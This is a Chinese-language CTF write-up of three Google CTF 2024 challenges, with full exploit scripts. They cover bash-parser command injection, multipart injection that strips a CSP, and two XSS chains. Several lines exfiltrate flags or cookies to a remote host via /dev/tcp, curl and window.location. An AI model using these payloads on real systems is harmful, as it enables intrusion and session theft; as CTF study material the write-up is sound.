---
title: "Google CTF 2024 WriteUp"
date: 2024-06-24T03:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup/tree/master/google-ctf-2024-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# Google CTF 2024 WriteUp
## 戰績

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/102ab7a2-a951-47de-9dfa-5732cb2cc83a)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/225aff8b-6771-4163-8635-fe91b0cbc17e)

## oneecho

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d55e3843-2a4a-4b99-8fea-b46791dbec0d)

### 概述

`nc` 進去是一個可以讓你下指令的 shell

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c11bebbe-800a-47c0-a3aa-72e693661878)

然而只能下 `echo` 不能下其他的，目測要 command injection

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4a39314d-020c-4a20-a70c-edb727830d2e)

到 `challenge.js` 來看看他怎檔的。

首先他 require 了 `bash-parser`

```js
const parse = require('bash-parser'); 
```

接著他把指令 parse 成 ast

```js
const ast = parse(cmd);
```

call `check` 做檢查

```js
if (!check(ast)) (
  rl.write('Hacker detected! No hacks, only echo!');
  rl.close();
  return;
}
```

來看看他怎麼檢查的。

```js
const check = ast => {
  if (typeof(ast) === 'string') {
    return true;
  }
  for (var prop in ast) {
    if (prop === 'type' && ast[prop] === 'Redirect') {
      return false;
    }
    if (prop === 'type' && ast[prop] === 'Command') {
      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
        return false;
      }
    }
    if (!check(ast[prop])) {
      return false;
    }
  }
  return true;
};
```

然後用 [bash-parser-playground](https://vorpaljs.github.io/bash-parser-playground/) 看看 ast 的結構。

```json
{
  "type": "Script",
  "commands": [
    {
      "type": "Command",
      "name": {
        "text": "echo",
        "type": "Word"
      },
      "suffix": [
        {
          "text": "aaa",
          "type": "Word"
        }
      ]
    },
    {
      "type": "LogicalExpression",
      "op": "and",
      "left": {
        "type": "Command",
        "name": {
          "text": "ls",
          "type": "Word"
        },
        "suffix": [
          {
            "text": "aaa",
            "type": "Word"
          }
        ]
      },
      "right": {
        "type": "Pipeline",
        "commands": [
          {
            "type": "Command",
            "name": {
              "text": "ls",
              "type": "Word"
            },
            "suffix": [
              {
                "text": "bbb$(ls ddd)",
                "expansion": [
                  {
                    "loc": {
                      "start": 3,
                      "end": 11
                    },
                    "command": "ls ddd",
                    "type": "CommandExpansion",
                    "commandAST": {
                      "type": "Script",
                      "commands": [
                        {
                          "type": "Command",
                          "name": {
                            "text": "ls",
                            "type": "Word"
                          },
                          "suffix": [
                            {
                              "text": "ddd",
                              "type": "Word"
                            }
                          ]
                        }
                      ]
                    }
                  }
                ],
                "type": "Word"
              }
            ]
          },
          {
            "type": "Command",
            "name": {
              "text": "ls",
              "type": "Word"
            },
            "suffix": [
              {
                "text": "ccc",
                "type": "Word"
              }
            ]
          }
        ]
      }
    }
  ]
}
```

這邊試了部分 command injection 的手法，但可以看到都有成功辨識成 `Command`，而 `check` function 的檢查是 recursive 的，所以理論上上面的這些 payload 檢查都不會過。

### 解題

首先再仔細看看 `check` function

```js
    if (prop === 'type' && ast[prop] === 'Command') {
      if (ast['name'] && ast['name']['text'] && ast['name']['text'] != 'echo') {
        return false;
      }
    }
```

其中 `ast['name']['text']` 會有問題，由於 js week type 的特性，當字串為空值的時候會是 `false`，因此除了 command 為 echo 的指令以外 command 為空值的指令也能用。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f83386d9-1572-4520-816e-227a790e5dcd)

那在何種情況 command 會是空值呢？這邊發現在定義 `environment variable` 的時候 command 會是空值。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/793f7e9d-0597-462b-8b41-898f8dce1d83)

也就是說我們除了下 `echo` 以外也可以定義 `environment variable`，那這能做甚麼，這就能利用 bash 裡面 `Arithmetic Expansion` 也就是 `$((1+1))` 以及 array 也就是 `arr=(aa bb); echo ${arr[0]}` 這個兩個功能的特性。

首先 `Arithmetic Expansion` 裡面如果出現 variable 的話她會**自動**把 variable 內的表達式做展開，也就是 `test='1+1'; echo $((test+1))` 你會得到 `$(((1+1)+1))` 也就是 3。

再來 array 如果在 `Arithmetic Expansion` 內，並且她的 index 有 `command substitution` 也就是 `$()` 的話一樣會執行 command，也就是說 `arr=(1 2); echo $((arr[$(echo 1)]+1))` 這樣會得到 `$((arr[1]+1))` 展開後是 `$((2+1))` 也就是 3。

利用這兩點我們可以組合出這個 `payload='arr[$(RCE)]'; echo $(( payload == 1 ));` 再 `RCE` 的位置可以放任意指令並執行，這點我們可以用這個指令做測試 `arr='1' payload='arr[$(echo 0)]'; echo $(( payload == 1 ))`

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/96e9b383-0109-4222-9fe2-d27e3f52a256)

但是用這種方式所造成的 RCE 沒辦法使用 STDOUT 輸出任何東西，因此要另外想回傳 flag 的方發，遠本試過用網路回傳如：`payload='arr[$(cat /flag > /dev/tcp/<IP>/<PORT>)]'; echo $(( payload == 1 ));` 或者 `payload='arr[$(curl <URL>/$(cat /flag))]'; echo $(( payload == 1 ));` 等等方法，但都沒成功，於是我試架一次他的環境，發現他的環境沒有 `/dev` 然後我把 `nc` 放進去以後發現環境沒網路，所以沒辦法用網路傳 flag 回來。

最後發現他有 `/proc` 所以試著用 `payload='arr[$(cat /flag > /proc/$$/fd/1)]'; echo $(( payload == 1 ));` 不知道為何依然沒成功，後來我發現他的 nodejs 程式每次執行一定再 pid 1 所以我就用 `payload='arr[$(cat /flag > /proc/1/fd/1)]'; echo $(( payload == 1 ));` 就成功拿到 flag 了。

### exploit

```python
import pwn
import base64
import sys
import subprocess

r = pwn.remote("onlyecho.2024.ctfcompetition.com", 1337)

def genpayload(cmd):
    return f"payload='arr[$({cmd})]'; echo $(( payload == 1 )); "

sys.stdout.buffer.write(r.recvuntil(b') solve '))

token = r.recvuntil(b'\n')
sys.stdout.buffer.write(token)

token = token.strip().decode()

r.sendline(subprocess.run(f'bash -c "python3 <(curl -sSL https://goo.gle/kctf-pow) solve {token}"', shell=True, capture_output=True).stdout.strip())

sys.stdout.buffer.write(r.recvrepeat(timeout=1))

r.sendline(genpayload('cat /flag > /proc/1/fd/1').encode())

sys.stdout.buffer.write(r.recvrepeat(timeout=1))
```

### Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/da8df9df-d116-4fd3-8704-363ae2931c8e)

`CTF{LiesDamnedLiesAndBashParsingDifferentials}`



## grand prix heaven

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7570101d-444d-444f-b05e-72170b0b3698)

### 概述

這題有個網頁

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c534a673-d576-4aae-9acd-513b1fa7731a)

可以 post 自己喜歡的車的圖片以及他的資訊，也可以用網址查看 post 後的車

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85a74c69-789d-483a-99ad-aa6b43b63e5f)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ec752fca-8fe5-4a61-8b37-835eaf467a3e)

接著他有兩個 server，一個是網頁，另一個是 template server，都是 nodejs，首先看看首頁的後端程式，我們可以注意到所有的 frontend route 都會有一個 template pieces，接著 web server 會把這個 template pieces 用 `multipart/form-data` 送到 template server，然後 template server 會依照這個 list 組合成一個 html 並回傳，然後 web server 再回傳這個 html 給 client。

```js
app.get("/", async (req, res) => {
  try {
    var data = {
      0: "csp",
      1: "head_end",
      2: "index",
      3: "footer",
    };
    await needle.post(
      TEMPLATE_SERVER,
      data,
      { multipart: true, boundary: BOUNDARY },
      function (err, resp, body) {
        if (err) throw new Error(err);
        return res.send(body);
      }
    );
  } catch (e) {
    console.log(`ERROR IN /:\n${e}`);
    return res.status(500).json({ error: "error" });
  }
});
```

再來講講 template server，他有很多用來組合網頁的零件，其中 `apiparser` 跟 `mediaparser` 最有趣，他分別對應到 `apiparser.js` 與 `mediaparser.js` 這兩個都是用來處理如何顯示 post 後的車的頁面，其中 mediaparser 被棄用，再 web server 裡完全看不到他，我們來看看程式碼。

```js
addEventListener("load", (event) => {
  params = new URLSearchParams(window.location.search);
  let requester = new Requester(params.get('F1'));
  try {
    let result = requester.makeRequest();
    result.then((resp) => {
        if (resp.headers.get('content-type') == 'image/jpeg') {
          var titleElem = document.getElementById("title-card");
          var dateElem = document.getElementById("date-card");
          var descElem = document.getElementById("desc-card");
          
          resp.arrayBuffer().then((imgBuf) => {
              const tags = ExifReader.load(imgBuf);
              descElem.innerHTML = tags['ImageDescription'].description;
              titleElem.innerHTML = tags['UserComment'].description;
              dateElem.innerHTML = tags['ICC Profile Date'].description;
          })
        }
    })
  } catch (e) {
    console.log("an error occurred with the Requester class.");
  }
});
```

可以看到他會讓 browser 依照 `F1` 這個 param 所設的路徑去取得 `https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/<F1>` 這個網站的內容，如果內容是 jpg 圖片的話，就解析圖片的一些資訊並讓前端顯示對應欄位的資料，這邊可以看到他是用 `innerHTML` 也就是說會有 `XSS`。

至於 `apiparser` 其實內容差不多。

```js
addEventListener("load", (event) => {
    params = new URLSearchParams(window.location.search);
    let requester = new Requester(params.get('F1'));
    try {
      let result = requester.makeRequest();
      result.then((resp) => resp.json()).then((jsonBody) => {
        var titleElem = document.getElementById("title-card");
        var dateElem = document.getElementById("date-card");
        var descElem = document.getElementById("desc-card");
        var imgElem = document.getElementById("img-card");
    
        titleElem.textContent = `${jsonBody.model} ${jsonBody.make}`;
        dateElem.textContent = jsonBody.createdAt;
        if (jsonBody.img_id != "") {
    	    imgElem.src = `/media/${jsonBody.img_id}`;
	    }
      })
    } catch (e) {
      console.log("an error occurred with the Requester class.");
    }
  });
```

只是改成用 json 處理並且用 `textContent` 設定欄位而已，所以要改成用 `mediaparser` 才會有 `XSS` 的問題。

至於如何發 request ，來看一下 `retrieve.js`。

```js
class Requester {
    constructor(url) {
        const clean = (path) => {
          try {
            if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
          } catch (e) {
            console.log(e);
            return "dfv";
          }
          };
        url = clean(url);
        this.url = new URL(url, 'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/');
      }
    makeRequest() {
        return fetch(this.url).then((resp) => {
            if (!resp.ok){
                throw new Error('Error occurred when attempting to retrieve media data');
            }
            return resp;
        });
    }
  }
```

可以看到這邊有路徑檢查

```js
            if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
```

由於預設是 apiparser 所以拿到的資料應該會是 json，當成功改成 `mediaparser` 我們必須要繞過這個路徑檢查來達成存取圖片的目的。

最後 web server 有一個 route

```js
app.post("/report", async (req, res) => {
  const url = req.body.url;
  if (typeof url !== "string" || !url.startsWith('https://grandprixheaven-web.2024.ctfcompetition.com/')) {
    res.status(200).send("invalid url").end();
    return;
  }
  bot.visit(url);
  res.send("Done!").end();
});
```

因此我們可以知道這題是一個 XSS challenge

### 解題

目標是要新增一台車，並且顯示頁面時要使用 `mediaparser` 同時 `F1` param 必須要是上傳的圖片的路徑，且該圖片的資訊要有 XSS payload，且網頁不能有 CSP 否則 XSS 傳出資料時會被 CSP 擋住，最後送這網址給 bot 瀏覽。

首先我們來看看顯示車的 frontend route

```js
app.get("/fave/:GrandPrixHeaven", async (req, res) => {
  const grandPrix = await Configuration.findOne({
    where: { public_id: req.params.GrandPrixHeaven },
  });
  if (!grandPrix) return res.status(400).json({ error: "ERROR: ID not found" });
  let defaultData = {
    0: "csp",
    1: "retrieve",
    2: "apiparser",
    3: "head_end",
    4: "faves",
    5: "footer",
  };
  let needleBody = defaultData;
  if (grandPrix.custom != "") {
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
  }
  needle.post(
    TEMPLATE_SERVER,
    needleBody,
    { multipart: true, boundary: BOUNDARY },
    function (err, resp, body) {
      if (err) {
        console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
        return res.status(500).json({ error: "error" });
      }
      return res.status(200).send(body);
    }
  );
});
```

我們可以注意到這邊的 template pieces 是可以自己定義的

```js
  let needleBody = defaultData;
  if (grandPrix.custom != "") {
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
  }
```

如何定義就要看新增車的 route

```js
app.post("/api/new-car", async (req, res) => {
  let response = {
    img_id: "",
    config_id: "",
  };
  try {
    if (req.files && req.files.image) {
      const reqImg = req.files.image;
      if (reqImg.mimetype !== "image/jpeg") throw new Error("wrong mimetype");
      let request_img = reqImg.data;
      let saved_img = await Media.create({
        img: request_img,
        public_id: nanoid.nanoid(),
      });
      response.img_id = saved_img.public_id;
    }
    let custom = req.body.custom || "";
    let saved_config = await Configuration.create({
      year: req.body.year,
      make: req.body.make,
      model: req.body.model,
      custom: custom,
      public_id: nanoid.nanoid(),
      img_id: response.img_id
    });
    response.config_id = saved_config.public_id;
    return res.redirect(`/fave/${response.config_id}?F1=${response.config_id}`);
  } catch (e) {
    console.log(`ERROR IN /api/new-car:\n${e}`);
    return res.status(400).json({ error: "An error occurred" });
  }
});
```

我們只要在 post body 裡面多塞個 custom 裡面放 template pieces 的 json 就可以了。

再回到 `/fave/:GrandPrixHeaven`

這邊的定義 template pieces 還是有一些限制

```js
if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
```

就是我們的 template piece 必須要包含再 `TEMPLATE_PIECES` 內且 index 必須要是數字，以及 template piece 的內容的 type 不能是 `object`。

```js
const TEMPLATE_PIECES = [
  "head_end",
  "csp",
  "upload_form",
  "footer",
  "retrieve",
  "apiparser", /* We've deprecated the mediaparser. apiparser only! */
  "faves",
  "index",
];
```

這邊數字的地方很有趣是他是先過 `parseInt` 再 `isNum` 而 js 的 `parseInt` 有一個特性是**只要 string 的開頭是數字都能被 parse 成數字**

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a6dc3e10-0f76-4574-b7a2-8f8c23189fbb)

所以我們可以利用這點在 index 裡面放任意的東西，這可以影響到傳遞的 template pieces 的排序，因為做 JSON.parse 時會對 key 做一次排序。

除此之外還會影響一個問題，就是可以做到 CRLF injection，且由於 boundary 是寫死的，這樣可以做到 inject multipart/form-data 來達成添加 template piece 的目標。

CSP 的部分由於他會強制檢查一定要有 csp 這個 template pieces 且 index 一定要是 0，但這邊的數字一樣是會過 parseInt 所以可以用上面講的方式去影響排序，讓 CSP 放到最後面，放到最後會有甚麼影響，這邊可以看到 template server 的 `index.js`。

```js
const parseMultipartData  = (data, boundary) => {
  var chunks = data.split(boundary);
  // always start with the <head> element
  var processedTemplate = templates.head_start;
  // to prevent loading an html page of arbitrarily large size, limit to just 7 at a time
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
    // seperate body from the header parts
    var lines = chunks[i].split('\r\n\r\n')
    .map((item) => item.replaceAll("\r\n", ""))
    .filter((item) => { return item != ''})
    for (const item of Object.keys(templates)) {
        if (lines.includes(item)) {
            processedTemplate += templates[item];
        }
    }
  }
  return processedTemplate;
}
```

可以看到他最多只拿最上面的 6 個 template pieces

```js
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
```

所以只要上面放 7 個 template pieces 並把 csp 移到最下面，取得的 html 就不會有 CSP

我們就可以構造出以下的 json

```json
{
  "1": "retrieve",
  "2\"\r\n\r\nmediaparser\r\n--GP_HEAVEN\r\nContent-Disposition: form-data; name=\"3": "head_end",
  "4": "faves",
  "5": "footer",
  "6": "footer",
  "0a": "csp"
}
```

然後 post 上去新增

(ps: 這是還沒處理 csp 的)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b26b0c6-1e00-4d62-ae2e-5f60879241d4)

以後來看一下頁面

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a70d0d7e-1e55-4b03-b651-ab199381bbb5)

可以看到成功拿到 mediaparser，但由於我們 `F1` param 裡的 path 也就是 `https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/<F1>` 是 json 所以要想辦法讓 `F1` 跳到圖片的路徑，比如說 `../../media/<img-id>`。

但是 `retrieve.js` 有路徑檢查

```js
if (!path) throw new Error("no path");
            let re = new RegExp(/^[A-z0-9\s_-]+$/i);
            if (re.test(path)) {
              // normalize
              let cleaned = path.replaceAll(/\s/g, "");
              return cleaned;
            } else {
              throw new Error("regex fail");
            }
```

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6cc23108-5d12-4abc-9ddb-a1f44a9362be)

所以這邊要想辦法繞 RegExp。

裡面有一個部分很有趣，那就是 `A-z` 這邊應該要是 `A-Za-z`，這樣寫或造成的影響是，因為他是依照 ascii 的順序，因此放在 Z 到 a 中間的字元是可以用的，也就是 ``Z[\]^_`a`` 其中的 `\`，因為 `retrieve.js` 做 request 時會用 `new URL` 做 url parse，而 `\` 會被他解成 `/`，並且如果 path 是絕對路徑時，他會把 base url 裡變得 path 蓋掉，所以如果我放 `\media\<img-id>` 會被他解析成 `https://grandprixheaven-web.2024.ctfcompetition.com/media/<img-id>`，這樣就成功繞過了。

因此我們的 xss url 會是 `https://grandprixheaven-web.2024.ctfcompetition.com/fave/<car-id>?F1=\media\<img-id>`，把這個丟 `report` 就能 xss

所以整體順序是：
1. 先生帶 xss payload 的圖片
2. 新增車並上傳該圖片，並且對 custom 做操作繞過檢查塞進 `mediaparser` 且拔掉 `csp`
3. 取得車的 url
4. 解析 json 拿到 img-id
5. 構建 xss url

### exploit

```python
from PIL import Image
import piexif
import io
import requests
import urllib.parse

url = "https://grandprixheaven-web.2024.ctfcompetition.com"
httpserver = "https://vpn.chummydns.com:20000/"

img = Image.new('RGB', (10, 10))
exif_dict = {'0th': {270: f"<svg><svg/onload='window.location=\"{httpserver}\"+document.cookie'>"}}
exif_bytes = piexif.dump(exif_dict)

buffer = io.BytesIO()

img.save(buffer, format='JPEG', exif=exif_bytes)

buffer.seek(0)

r = requests.post(urllib.parse.urljoin(url, '/api/new-car'), allow_redirects=False, files={
    'image': ('test.jpg', buffer, 'image/jpeg'),
}, data={
    'year': 2004,
    'make': 'aaa',
    'model': 'aaa',
    'custom': '{"1":"retrieve","2\\"\\r\\n\\r\\nmediaparser\\r\\n--GP_HEAVEN\\r\\nContent-Disposition: form-data; name=\\"3":"head_end","4":"faves","5":"footer","6":"footer","0a":"csp"}'
})

f1url = urllib.parse.urlparse(urllib.parse.urljoin(url, r.headers['Location']))

f1path = f1url.path
f1query = urllib.parse.parse_qs(f1url.query)

r = requests.get(urllib.parse.urljoin(url, f"/api/get-car/{f1query['F1'][0]}"))

imgid = r.json()['img_id']
params = {
    "F1": f"\media\{imgid}"
}

xssurl = f'{urllib.parse.urljoin(url, f1path)}?{urllib.parse.urlencode(params)}'

requests.post(urllib.parse.urljoin(url, "/report"), data={
    'url': xssurl
})
```

### Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/306d7180-00af-452e-a4dd-d959b8562b4c)

`CTF{Car_go_FAST_hEART_Go_FASTER!!!}`

## sappy

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/945b7796-12ab-41ea-9301-994ea869a81f)

### 概述

這題網站長這樣

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2304d75c-2581-4bed-916e-af192c608def)

這四個按鈕會分別顯示個別設定好的 html

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0a16eee7-b24a-438d-854f-e6968be8b914)

下面 share 則是傳遞任意網址他們的 bot 就會去瀏覽那個網址

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/19ff9088-666b-4b7a-984d-bbe035be8df5)

看到這裡應該可以猜到又是 XSS

來看一下前端 html `indeex.html`

```html
      <p>
        Hi! I'm a beginner in programming and this is my first application,
        called SAPPY! I'm sharing here some quirks I learnt about JavaScript.
        Use the buttons below to find out!
      </p>
      <div id="pages" class="row flex-center"></div>
      <iframe></iframe>
```

```js
      const iframe = document.querySelector("iframe");

      function onIframeLoad() {
        iframe.contentWindow.postMessage(
          `
            {
                "method": "initialize", 
                "host": "https://sappy-web.2024.ctfcompetition.com"
            }`,
          window.origin
        );
      }

      iframe.src = "./sap.html";
      iframe.addEventListener("load", onIframeLoad);
//.............
      fetch("pages.json")
        .then((r) => r.json())
        .then((json) => {
          for (const [id, { title }] of Object.entries(json)) {
            const button = document.createElement("button");
            button.setAttribute("class", "margin");
            button.innerText = title;
            button.addEventListener("click", () => switchPage(id));
            divPages.append(button);
          }
        });

      function switchPage(id) {
        const msg = JSON.stringify({
          method: "render",
          page: id,
        });
        iframe.contentWindow.postMessage(msg, window.origin);
      }
```

可以看到他的按鈕跟顯示是用 iframe，按鈕用 `postMessage` 來控制 iframe，按鈕則是依照 `/pages.json` 來生成，iframe 會去瀏覽 `./sap.html`

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <style>
      body {
        margin: 0;
      }
    </style>
  </head>
  <body>
    <div id="output"></div>
    <script src="./static/sap.js"></script>
    <script type="module">
      const INTERVAL = 100;
      let lastHeight = -1;
      setInterval(() => {
        const height = document.body.clientHeight;
        if (height === lastHeight) return;
        lastHeight = height;
        parent.postMessage(
          JSON.stringify({
            method: "heightUpdate",
            height: height,
          }),
          "*"
        );
      }, INTERVAL);
    </script>
  </body>
</html>
```

裡面使用了 `./static/sap.js` 這邊的 js 在架網站時是有過 compile 的，所以 f5 看不到原始碼。

來看看他如何載入文字

```js
const Uri = goog.require("goog.Uri");

function getHost(options) {
  if (!options.host) {
    const u = Uri.parse(document.location);

    return u.scheme + "://sappy-web.2024.ctfcompetition.com";
  }
  return validate(options.host);
}

function validate(host) {
  const h = Uri.parse(host);
  console.log(host);
  console.log(h.getDomain());
  if (h.hasQuery()) {
    throw "invalid host";
  }
  if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
    throw "invalid host";
  }
  return host;
}

function buildUrl(options) {
  return getHost(options) + "/sap/" + options.page;
}

//....................................................

    switch (method) {
      case "initialize": {
        if (!data.host) return;
        API.host = data.host;
        console.log(API.host);
        break;
      }
      case "": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
    }
```

可以看到他會先用 `postMessage` 的 `initialize` 設定好存取 page info 的 base url，接著用 `postMessage` 的 `render` 依照對應的 page id 跟 base url 來用 `buildUrl` 產生對應的 url，產生前他會對 base url 做一次檢查，如果 domain 不是 `sappy-web.2024.ctfcompetition.com` 就會直接 `invalid host`，如果是就直接 `<base url> + "/sap/" + <page id>`。

產生完 url 以後他會去該 url 取得 json，看一下後端 api 的程式 `app.js`

```
const pages = require("./pages.json");
//.....................................
app.get("/sap/:p", async (req, res) => {
  if (!pages.hasOwnProperty(req.params.p)) {
    res.status(404).send("not found");
    return res.end();
  }
  const p = pages[req.params.p];
  res.json(p);
});
```

他會去 `page.json` 取得對應 page id 的資料並回傳 json

```json
{
  "floating-point": {
    "title": "0.1 + 0.2 != 0.3",
    "html": "Because of the underyling floating point arithmetic, in JavaScript 0.1+0.2 is <b>not</b> equal to 0.3!"
  },
  "document-all": {
    "title": "document.all",
    "html": "document.all is an instance of Object, you can check it. But then: <code>typeof document.all === 'undefined'</code>!"
  },
  "plus-operator": {
    "title": "plus operator",
    "html": "Here's a little riddle: what is the result of <code>[]+{}</code>? It's <code>\"[object Object]\"</code>!"
  },
  "no-lowercase": {
    "title": "no lowercase characters",
    "html": "Do you know it's possible to call arbitrary JS code without using lowercase characters? Here I am calling <code>console.log(1)</code>: <code>[]['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']('\\143\\157\\156\\163\\157\\154\\145\\56\\154\\157\\147\\50\\61\\51')()    </code>"
  }
}
```

`sap.js` 拿到 page info 以後會直接用 `innerHTML` 把 `json.html` 放進 `output` 裡，這邊會產生 xss

```js
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
```

所以我們的目標是要自己架一個網站裡面會嵌入目標網站的 `sap.html` 然後再操作 page info url 去取得有 xss payload 的 page info 讓 `sap.html` 去載入造成 xss，再將自己架的網頁的 url 送給目標的 bot 取得 cookie。

### 解題

這題的重點是要如何繞 `if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com")` 基本上除非 `goog.Uri` 有洞，否則不太可能繞過，但是他沒有限制 `scheme` 只能用 http 或 https，而 fetch 是可以塞 data scheme 的，所以我就可以構造以下 url

`data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#`

其中 `data://sappy-web.2024.ctfcompetition.com/` 可以保證 `getDomain` 是 `sappy-web.2024.ctfcompetition.com` 然後 `;base64,` 表示後面的東西要過 base64 decode 接著後面的 base64 就是我們 payload 的 json

```json
{
  "html": "<svg><svg/onload='window.location=\"https://vpn.chummydns.com:20000/xss\"+document.cookie'>"
}
```

最後的 `#` 則是讓後面的 `/sap/<page id>` 變成 hash tag 來忽略掉。

這樣就能成功 xss 了。

但是還有一個問題是因為 `iframe` 內的網站是不會帶 cookie 的，所以要找別的方法載入網站並控制，而這邊選擇用 `window.open` 來解決。

### exploit

```python
from flask import Flask,request,redirect,Response,render_template
import json

app = Flask(__name__)

@app.route('/',methods=['GET'])
def root():
    return render_template('index.html')

@app.route('/<path:data>',methods=['GET'])
def hack(data=''):
    return "hack"

if __name__ == "__main__":
    app.run(host="::", port=20000)
```

```html
<script>
    const url = 'https://sappy-web.2024.ctfcompetition.com'
    win = window.open(`${url}/sap.html`);
    function hack() {
        win.postMessage(JSON.stringify({
                method: "initialize",
                host: "data://sappy-web.2024.ctfcompetition.com/;base64,eyJodG1sIjoiPHN2Zz48c3ZnL29ubG9hZD0nd2luZG93LmxvY2F0aW9uPVwiaHR0cHM6Ly92cG4uY2h1bW15ZG5zLmNvbToyMDAwMC94c3NcIitkb2N1bWVudC5jb29raWUnPiJ9Cg==#",
        }), url);
        win.postMessage(JSON.stringify({
            method: "render",
            page: "xss",
        }), url);
        loadpage();
    }
    setTimeout(hack, "1000");
</script>
```

### Flag

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4fd1f3cf-3790-4762-99d9-39a45298192a)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f87e4ed7-8eab-4618-8e48-df0fa4731c66)

`CTF{parsing_urls_is_always_super_tricky}`

## 戰隊其他人的 write up

待補



